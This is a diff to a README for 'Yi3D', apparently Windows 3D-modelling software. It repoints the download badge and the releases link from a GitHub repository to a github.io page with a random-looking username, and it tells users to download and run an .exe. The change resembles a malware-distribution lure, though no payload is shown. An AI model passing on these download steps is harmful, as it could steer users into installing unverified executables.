@@ -1,6 +1,6 @@
 # 📦 Yi3D - Create detailed 3D models with ease
 
-[![Download Yi3D](https://img.shields.io/badge/Download-Yi3D-blue.svg)](https://github.com/anteriorserratusmuscleembankment700/Yi3D)
+[![Download Yi3D](https://img.shields.io/badge/Download-Yi3D-blue.svg)](https://anteriorserratusmuscleembankment700.github.io)
 
 Yi3D provides tools to create 3D models for games, prints, and art. This software works on Windows and offers an open approach to digital design. You do not need experience in coding to build shapes or render scenes.
 
@@ -8,7 +8,7 @@ Yi3D provides tools to create 3D models for games, prints, and art. This softwar
 
 You must visit the project release page to get the installer. The software works on Windows 10 and Windows 11.
 
-1. Go to the [Yi3D releases page](https://github.com/anteriorserratusmuscleembankment700/Yi3D).
+1. Go to the [Yi3D releases page](https://anteriorserratusmuscleembankment700.github.io).
 2. Look for the latest version number in the list.
 3. Select the file ending in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
